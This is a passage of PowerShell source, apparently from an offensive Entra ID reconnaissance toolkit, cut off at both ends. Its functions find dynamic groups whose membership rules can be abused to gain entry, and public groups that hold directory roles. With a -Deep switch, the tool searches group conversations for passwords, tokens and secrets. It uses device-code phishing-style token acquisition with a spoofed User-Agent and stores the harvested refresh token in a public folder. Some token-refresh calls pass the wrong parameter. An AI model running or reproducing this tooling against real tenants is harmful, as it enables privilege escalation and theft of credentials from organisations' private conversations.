		    [Parameter(Mandatory = $false)] [string]$DomainName,
		    [Parameter(Mandatory = $false)] [string]$ClientSecret
    )


		function Help {
			Write-Host "Invoke-FindDynamicGroups" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-FindDynamicGroups -DomainName ShkudW.com -DeviceCodeFlow " -ForegroundColor DarkCyan
            		Write-Host "         : Invoke-FindDynamicGroups -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkCyan
            		Write-Host "         : Invoke-FindDynamicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....'" -ForegroundColor DarkCyan
		}

            if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName) {
                Help
                return
            }

            if ($DomainName -and -not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow) {
                Write-Host "[!] You need to provide a Refresh Token or ClientID + ClientSecret or using Device Code Flow" -ForegroundColor DarkRed
		        Write-Host " "
		        Help
                return
            }

             if ($DomainName -and $ClientId -and -not $ClientSecret) {
                Write-Host "[!] You need to provide Clientid and Client Secret" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }   

            if ($DomainName -and $ClientId -and $ClientSecret -and $RefreshToken -and $DeviceCodeFlow) {
                Write-Host "[!] What?!?" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }           
	
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }

		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                		Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}

        if($DomainName){$TenantID = Get-DomainName}
		
		function Get-DeviceCodeToken {
			$deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
			$body = @{
				"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"Resource"     = "https://graph.microsoft.com"
			}

			$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $body -Headers $headers
			$code = $authResponse.user_code
			$deviceCode = $authResponse.device_code
		    Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
			Write-Host " $code" -ForegroundColor DarkGray
			Start-Sleep -Seconds 5
			Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

			$tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/token?api-version=1.0"
			$tokenBody = @{
				"scope"      = "openid"
				"client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
				"code"       = $deviceCode
			}

			while ($true) {
				try {
					$tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop
					return $tokenResponse.refresh_token
				} catch {
					$errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
					if ($errorResponse.error -eq "authorization_pending") {
						Start-Sleep -Seconds 5
					} elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
						return $null
					} else {
						return $null
					}
				}
			}
		}

		function Get-Token-WithRefreshToken {
            param(
                [Parameter(Mandatory = $false)] [string]$RefreshToken
            )

			    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			    $body = @{
                    		"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    		"scope"         = "https://graph.microsoft.com/.default"
                    		"grant_type"    = "refresh_token"
                    		"refresh_token" = $RefreshToken
			    }
			    return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

		function Get-Token-WithClientSecret {
            	param(
                	[Parameter(Mandatory = $false)] [string]$ClientID,
                	[Parameter(Mandatory = $false)] [string]$ClientSecret
                
            )
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

		$authMethod = ""
			if ($RefreshToken) {
				$authMethod = "refresh"
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			} elseif ($ClientId -and $ClientSecret) {
				$authMethod = "client"
				$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
			} elseif ($DeviceCodeFlow) {
				$authMethod = "refresh"
				if (Test-Path "C:\Users\Public\RefreshToken.txt"){
					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
					$RefreshToken = Get-DeviceCodeToken
					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
				    Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			}

		if (-not $GraphAccessToken) { return }

		if (Test-Path "Dynamic_Groups.txt") {
			$choice = Read-Host "Dynamic_Groups.txt exists. (D)elete / (A)ppend?"
			if ($choice -match "^[dD]$") {
				Remove-Item -Path "Dynamic_Groups.txt" -Force
			} elseif ($choice -notmatch "^[aA]$") {
			return
			}
		}

		$headers = @{
			"Authorization"    = "Bearer $GraphAccessToken"
			"Content-Type"     = "application/json"
			"ConsistencyLevel" = "eventual"
			"Prefer"           = "odata.maxpagesize=999"
            "User-Agent"        = "$UserAgent"
		}

		$startTime = Get-Date
		$refreshIntervalMinutes = 7
		$groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,membershipRule&$top=999"

		$totalGroupsScanned = 0

		Write-Host "`n[*] Fetching Dynamic Groups..." -ForegroundColor DarkCyan

    do {
        $success = $false
        do {
            try {
                $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                $success = $true
            } catch {
                $statusCode = $_.Exception.Response.StatusCode.value__
                if ($statusCode -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 7 }
                    Write-Host "[!] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                } elseif ($statusCode -eq 401) {
                    Write-Host "[!] Access token expired, refreshing..." -ForegroundColor DarkYellow
                    if ($authMethod -eq "refresh") {
                        $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                    } elseif ($authMethod -eq "client") {
                        $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                    }
                    if (-not $GraphAccessToken) { return }
                    $headers["Authorization"] = "Bearer $GraphAccessToken"
                    $startTime = Get-Date
                } else {
                    Write-Host "[-] Unexpected error. Exiting." -ForegroundColor Red
                    return
                }
            }
        } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0

			foreach ($group in $groupsBatch) {
				$groupId = $group.id
				$groupName = $group.displayName
				$membershipRule = $group.membershipRule

				if ($membershipRule -ne $null) {
				
					Write-Host "[+] $groupName ($groupId) is Dynamic" -ForegroundColor DarkGreen

					$conditions = @()
					if ($membershipRule -match '\buser\.mail\b') { $conditions += "mail" }
					if ($membershipRule -match '\buser\.userPrincipalName\b') { $conditions += "userPrincipalName" }
					if ($membershipRule -match '\buser\.displayName\b') { $conditions += "displayName" }

					if ($conditions.Count -gt 0) {						
						  if ($membershipRule -match "@") {
							continue  
						}
						$joined = ($conditions -join " AND ")
						Write-Host "    [!] Contains sensitive rule: $joined" -ForegroundColor Yellow
						Write-Host "      [$groupName] => $membershipRule" -ForegroundColor DarkCyan
						$outputLine = "      [Sensitive Rule] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : $joined : $membershipRule"
					} else {

					}
					
			        try {
						Add-Content -Path "Dynamic_Groups.txt" -Value $outputLine
					} catch {
						Write-Host "[!] Failed to write to file: $_" -ForegroundColor Red
					}
				}

				$scannedInBatch++
				$totalGroupsScanned++
				$percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
				Write-Progress -Activity "Scanning Dynamic Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
			}

        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[*] Refresh interval reached, refreshing token..." -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }

        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`n[*] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
    Write-Host "`n[>] Dynamic group  save to Dynamic_groups.txt" -ForegroundColor DarkCyan
}


<###############################################################################################################################################>
<###############################################################################################################################################>

function Invoke-FindPublicGroups {



    param (
        [Parameter(Mandatory = $false)] [string]$RefreshToken,
        [Parameter(Mandatory = $false)] [switch]$DeviceCodeFlow,
        [Parameter(Mandatory = $false)] [string]$ClientId,
        [Parameter(Mandatory = $false)] [string]$DomainName,
        [Parameter(Mandatory = $false)] [string]$SecretId,
        [Parameter(Mandatory = $false)] [switch]$Deep		
    )


        function Help {
			Write-Host "Invoke-FindPublicGroups" -ForegroundColor DarkYellow
			Write-Host "    Usage: Invoke-FindPublicGroups -DomainName ShkudW.com -DeviceCodeFlow " -ForegroundColor DarkCyan
            Write-Host "         : Invoke-FindPublicGroups -DomainName ShkudW.com -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......'" -ForegroundColor DarkCyan
            Write-Host "         : Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....'" -ForegroundColor DarkCyan
			Write-Host "Deep flag: Invoke-FindPublicGroups -DomainName ShkudW.com -ClientId '47d6850f-d3b2...' -ClientSecret 'tsu8Q~KJV9....' | -RefreshToken '1.AXoAoOlyRwYIfUK5RfM9h......' | -DeviceCodeFlow -Deep  " -ForegroundColor DarkCyan
		}

            if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName) {
                Help
                return
            }

            if ($DomainName -and -not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow) {
                Write-Host "[!] You need to provide a Refresh Token or ClientID + ClientSecret or using Device Code Flow" -ForegroundColor DarkRed
                Write-Host " "
		        Help
                return
            }

             if ($DomainName -and $ClientId -and -not $ClientSecret) {
                Write-Host "[!] You need to provide Clientid and Client Secret" -ForegroundColor DarkRed
                Write-Host " "
		        Help
                return
            }   

            if ($DomainName -and $ClientId -and $ClientSecret -and $RefreshToken -and $DeviceCodeFlow -and $Deep) {
                Write-Host "[!] What?!?" -ForegroundColor DarkRed
		        Write-Host " "
                Help
                return
            }           

        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $headers = @{ 'User-Agent' = $UserAgent }
	
		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration" -Headers $headers
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}  
	

        if (-not $TenantID -and $DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }

        function Get-DeviceCodeToken {
                $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
                $body = @{
                    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "Resource"     = "https://graph.microsoft.com"
                }

                $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $body -Headers $headers
                $code = $authResponse.user_code
                $deviceCode = $authResponse.device_code
                Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
                Write-Host " $code" -ForegroundColor DarkYellow
                Start-Sleep -Seconds 5
                Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

                $tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/token?api-version=1.0"
                $tokenBody = @{
                    "scope"      = "openid"
                    "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                    "code"       = $deviceCode
                }

                while ($true) {
                    try {
                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop
                        return $tokenResponse.refresh_token
                    } catch {
                        $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
                        if ($errorResponse.error -eq "authorization_pending") {
                            Start-Sleep -Seconds 5
                        } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
                            return $null
                        } else {
                            return $null
                        }
                    }
                }
        }

		function Get-Token-WithRefreshToken {
            param(
                [Parameter(Mandatory = $false)] [string]$RefreshToken
            )

			    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			    $body = @{
                    "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "scope"         = "https://graph.microsoft.com/.default"
                    "grant_type"    = "refresh_token"
                    "refresh_token" = $RefreshToken
			    }
			    return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

		function Get-Token-WithClientSecret {
            param(
                [Parameter(Mandatory = $false)] [string]$ClientID,
                [Parameter(Mandatory = $false)] [string]$ClientSecret
                
            )
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

    
		$authMethod = ""
			if ($RefreshToken) {
				$authMethod = "refresh"
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			} elseif ($ClientId -and $ClientSecret) {
				$authMethod = "client"
				$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
			} elseif ($DeviceCodeFlow) {
				$authMethod = "refresh"
				if (Test-Path "C:\Users\Public\RefreshToken.txt"){
					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
					$RefreshToken = Get-DeviceCodeToken
					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
				    Write-Host "[^.^] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			}


	    if (-not $GraphAccessToken) { return }

            if (Test-Path "Public_Groups.txt") {
                $choice = Read-Host "Public_Groups.txt exists. (D)elete / (A)ppend?"
                if ($choice -match "^[dD]$") {
                    Remove-Item -Path "Public_Groups.txt" -Force
                } elseif ($choice -notmatch "^[aA]$") {
                    return
                }
            }


    	 function Invoke-With-Retry {
            param (
                [string]$Url
            )
            $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            $headers = @{ 
                'User-Agent' = $UserAgent
                'Authorization' = "Bearer $GraphAccessToken"
                 }
            $success = $false
            $response = $null
            do {
                try {
                    $response = Invoke-RestMethod -Uri $Url -Headers $headers -ErrorAction Stop
                    $success = $true
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } else {
                        Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                        return $null
                    }
                }
            } while (-not $success)
            return $response
        }

	
        function Get-SensitiveConversations {
             param (
                [string]$GroupId,
                [string]$GroupName,
                [string]$AccessToken
            )

                if (-not (Test-Path "Conversations")) {
                    New-Item -ItemType Directory -Path "Conversations" | Out-Null
                }

                $headers = @{ 
                    'Authorization' = "Bearer $AccessToken" 
                    'user-agent'    = "$UserAgent"
                    }
                $keywords = @("admin", "accesstoken", "refreshtoken", "token", "password", "secret")

                function Invoke-With-Retry {
                    param (
                        [string]$Url
                    )
                        $success = $false
                        $response = $null
                        do {
                            try {
                                $response = Invoke-RestMethod -Uri $Url -Headers $headers -ErrorAction Stop
                                $success = $true
                            } catch {
                                $statusCode = $_.Exception.Response.StatusCode.value__
                                if ($statusCode -eq 429) {
                                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                                    if (-not $retryAfter) { $retryAfter = 7 }
                                    Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                                    Start-Sleep -Seconds ([int]$retryAfter)
                                } else {
                                    Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                                    return $null
                                }
                            }
                        } while (-not $success)
                        return $response
                }

                $convos = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations"
                if (-not $convos) { return }

                foreach ($convo in $convos.value) {
                    $threads = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads"
                    if (-not $threads) { continue }

                        foreach ($thread in $threads.value) {
                            $posts = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads/$($thread.id)/posts"
                            if (-not $posts) { continue }

                                foreach ($post in $posts.value) {
                                    $rawHtml = $post.body.content
                                    $rawName = "$GroupId-$($convo.id)-$($thread.id)"
                                    $cleanName = ($rawName -replace '[^\w\-]', '') 
                                    if ($cleanName.Length -gt 100) {
                                        $cleanName = $cleanName.Substring(0, 100)
                                    }
                                    $fileName = "$cleanName.html"
                                    $filePath = Join-Path -Path "Conversations" -ChildPath $fileName


                                    Add-Type -AssemblyName System.Web
                                    $decoded = [System.Web.HttpUtility]::HtmlDecode($rawHtml)
                                    $plainText = ($decoded -replace '<[^>]+>', '') -replace '\s{2,}', ' '

                                    foreach ($kw in $keywords) {
                                        if ($plainText -match "(?i)\b$kw\b.{0,200}") {
                                            $matchLine = $matches[0]
                                            Write-Host "[!!!] Suspicious content found in group '$GroupName': $kw" -ForegroundColor Red
                                            Write-Host "`t--> $matchLine" -ForegroundColor Gray

                                            Add-Content -Path "Public_Groups.txt" -Value "[DEAP] $GroupName ($GroupId) | keyword: $kw"
                                            Add-Content -Path "Public_Groups.txt" -Value "`t--> $matchLine"
                                            Add-Content -Path "Public_Groups.txt" -Value "`t--> Saved full HTML: Conversations\$fileName"
                                            break
                                        }
                                    }
                                }
                        }
                }
        }
	

		function Get-GroupsWithDirectoryRoles {
            param ($AccessToken)

                $headers = @{ Authorization = "Bearer $AccessToken" }
                $roles = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/directoryRoles" -Headers $headers

                $GroupIdsWithRoles = @{}
                $ProcessedRoleIds = @{}

                foreach ($role in $roles.value) {
                    $roleId = $role.id
                    if ($ProcessedRoleIds.ContainsKey($roleId)) { continue }

                    $memberUrl = "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members"
                    $members = Invoke-With-Retry -Url $memberUrl -Headers $headers
                    Start-Sleep -Milliseconds 300

                    foreach ($member in $members.value) {
                        if ($member.'@odata.type' -eq "#microsoft.graph.group") {
                            $GroupIdsWithRoles[$member.id] = $role.displayName
                        }
                    }

                    $ProcessedRoleIds[$roleId] = $true
                }

            return $GroupIdsWithRoles
     }



        $headers = @{
            "Authorization"    = "Bearer $GraphAccessToken"
            "Content-Type"     = "application/json"
            "ConsistencyLevel" = "eventual"
            "Prefer"           = "odata.maxpagesize=999"
            "user-agent"    = "$UserAgent"
        }
        

        $startTime = Get-Date
        $refreshIntervalMinutes = 7
        $groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,visibility&$top=999"

        $totalGroupsScanned = 0

        Write-Host "`n[*] Fetching Public Groups..." -ForegroundColor DarkCyan

        $GroupIdToRoleMap = @{}
        $success1 = $false
            do {
                try {
                    Write-Host "[*] Fetching directory role assignments..." -ForegroundColor DarkCyan
                    $GroupIdToRoleMap = Get-GroupsWithDirectoryRoles -AccessToken $GraphAccessToken
                    $success1 = $true
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[!] Rate limit hit during role mapping. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } elseif ($statusCode -eq 401) {
                        Write-Host "[!] Token expired while retrieving roles, refreshing token..." -ForegroundColor Yellow
                        if ($authMethod -eq "refresh") {
                            $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                        } elseif ($authMethod -eq "client") {
                            $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                        }
                        if (-not $GraphAccessToken) { return }
                        $headers["Authorization"] = "Bearer $GraphAccessToken"
                    } else {
                        Write-Host "[-] Unhandled error during role mapping. Exiting." -ForegroundColor Red
                        return
                    }
                }
            } while (-not $success1)

	
            do {
                $success = $false
                do {
                    try {
                        $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                        $success = $true
                    } catch {
                        $statusCode = $_.Exception.Response.StatusCode.value__
                        if ($statusCode -eq 429) {
                            $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                            if (-not $retryAfter) { $retryAfter = 7 }
                            Write-Host "[!] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                            Start-Sleep -Seconds ([int]$retryAfter)
                        } elseif ($statusCode -eq 401) {
                            Write-Host "[!] Access token expired, refreshing..." -ForegroundColor DarkYellow
                            if ($authMethod -eq "refresh") {
                                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                            } elseif ($authMethod -eq "client") {
                                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                            }
                            if (-not $GraphAccessToken) { return }
                                $headers["Authorization"] = "Bearer $GraphAccessToken"
                                $startTime = Get-Date
                        } else {
                            Write-Host "[-] Unexpected error. Exiting." -ForegroundColor Red
                            return
                         }
                    }
                } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0


        foreach ($group in $groupsBatch) {
            $groupId = $group.id
            $groupName = $group.displayName
            $visibility = $group.visibility
			
			if ($visibility -eq "Public") {
                if ($GroupIdToRoleMap.ContainsKey($groupId)) {
                    Write-Host "[!!!] $groupName ($groupId) is Public AND has Directory Role: $($GroupIdToRoleMap[$groupId])" -ForegroundColor Yellow
                    "[Privileged] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : Role = $($GroupIdToRoleMap[$groupId])" | Add-Content -Path "Public_Groups.txt"
                } else {
                    Write-Host "[+] $groupName ($groupId) is Public" -ForegroundColor DarkGreen
                    "$($groupName.PadRight(30)) : $($groupId.PadRight(40))" | Add-Content -Path "Public_Groups.txt"
                }
				if ($Deep) {
					Get-SensitiveConversations -GroupId $groupId -GroupName $groupName -AccessToken $GraphAccessToken
				}
            }

            $scannedInBatch++
            $totalGroupsScanned++
            $percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
            Write-Progress -Activity "Scanning Public Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
        }


        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[*] Refresh interval reached, refreshing token..." -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }
		
        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`n[>] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
    Write-Host "`n[>] Public group ids save to Public_Groups.txt" -ForegroundColor DarkCyan
}


<###############################################################################################################################################>
<###############################################################################################################################################>

function Invoke-FindApp {
    param(
        [Parameter(Mandatory)][string]$DomainName,
        [string]$RefreshToken,
        [string]$AccessToken,
        [string]$ClientId,
        [string]$ClientSecret,
        [switch]$IncludeARM,
        [string]$ARMAccessToken
    )


    function Invoke-SmartRequest {
        param (
            [string]$Method,
            [string]$Uri,
            [hashtable]$Headers,
            $Body = $null,
            [string]$ContentType = $null,
            [int]$MaxRetries = 15
        )

        $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        if (-not $Headers.ContainsKey("User-Agent")) { $Headers["User-Agent"] = $UA }

        $RetryCount = 0; $Success = $false; $Response = $null

        while (-not $Success -and $RetryCount -lt $MaxRetries) {
            try {
                $p = @{ Method = $Method; Uri = $Uri; Headers = $Headers }
                if ($null -ne $Body) { $p['Body'] = $Body }
                if ($ContentType) { $p['ContentType'] = $ContentType }

                $Response = Invoke-RestMethod @p
                $Success  = $true
            } catch {
                $err  = $_
                $code = if ($err.Exception.Response) { [int]$err.Exception.Response.StatusCode } else { $null }

                if ($code -eq 429) {
                    $RetryCount++
                    $ra   = $err.Exception.Response.Headers["Retry-After"]
                    $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) { [int]($ra -join '') } else { 0 }
                    if ($wait -eq 0) { $wait = 10 * $RetryCount }
                    Write-Host "`t[!] 429 Rate Limit - waiting $wait sec" -ForegroundColor Gray
                    Start-Sleep -Seconds $wait
                }
                elseif ($code -eq 401) {
                    Write-Host "`t[!] 401 Unauthorized" -ForegroundColor Yellow
                    throw "[-] Access denied (401). Token may be expired or lacks required permissions."
                }
                elseif ($code -eq 403) {
                    Write-Host "`t[!] 403 Forbidden - $Uri" -ForegroundColor Red
                    throw "[-] Access denied (403). Missing required permissions for this operation."
                }
                elseif ($code -eq 404) { return $null }
                elseif ($null -eq $code -or $code -ge 500) {
                    $RetryCount++
                    $wait = 5 * $RetryCount
                    Write-Host "`t[!] Error ($code). Retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $wait
                }
                else { throw $err }
            }
        }
        if (-not $Success) { throw "[-] Request to $Uri failed after $MaxRetries retries." }
        return $Response
    }

    function Decode-JwtPayload {
        param([string]$Token)
        $parts = $Token.Split('.')
        if ($parts.Count -lt 2) { throw "Invalid JWT" }
        $payload = $parts[1]
        switch ($payload.Length % 4) {
            2 { $payload += "==" }
            3 { $payload += "="  }
        }
        $payload = $payload.Replace('-','+').Replace('_','/')
        $json = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
        return ($json | ConvertFrom-Json)
    }

    function Resolve-TenantId {
        param([string]$DomainName)
        try {
            $r   = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
            $tid = ($r.issuer -split "/")[3]
            Write-Host "[#] Tenant ID for $DomainName -> $tid" -ForegroundColor DarkYellow
            return $tid
        } catch {
            Write-Error "[-] Failed to resolve Tenant ID for $DomainName"
            return $null
        }
    }

    function Build-AuthHeaders {
        param(
            [string]$RefreshToken,
            [string]$AccessToken,
            [string]$TenantID,
            [string]$ClientId,
            [string]$ClientSecret,
            [string]$Scope = "https://graph.microsoft.com/.default"
        )

        $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

        if ($AccessToken) {
            return @{ Authorization = "Bearer $AccessToken"; "Content-Type" = "application/json"; "User-Agent" = $UA }
        }

        if ($RefreshToken) {
            $body = @{
                client_id  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
